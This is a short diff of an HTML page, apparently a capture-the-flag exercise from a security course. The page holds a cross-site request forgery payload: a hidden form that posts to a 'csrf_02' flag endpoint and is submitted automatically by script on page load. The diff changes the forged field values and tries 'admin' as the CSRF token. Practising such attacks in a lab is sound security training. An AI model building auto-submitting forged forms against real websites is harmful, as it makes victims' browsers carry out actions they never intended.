@@ -5,9 +5,10 @@
   </head>
   <body>
     <p>I like cheese <strong>body</strong> Stronk <strong>p</strong></p>
-    <form name="csrfForm" action="https://flags.codepath.com/http/public/protected/flags/csrf_02/?firstname=&lastname=&csrf_token=admin" method="POST">
-      <input type="hidden" name="firstname" value="hacker" />
-      <input type="hidden" name="lastname" value="1000" />
+    <form name="csrfForm" action="https://flags.codepath.com/http/public/protected/flags/csrf_02/?firstname=&lastname=&csrf_token&" method="POST">
+      <input type="hidden" name="firstname" value="admin" />
+      <input type="hidden" name="lastname" value="admin" />
+      <input type="hidden" name="csrf_token" value="admin" />
     </form>
 <script>
  document.csrfForm.submit();
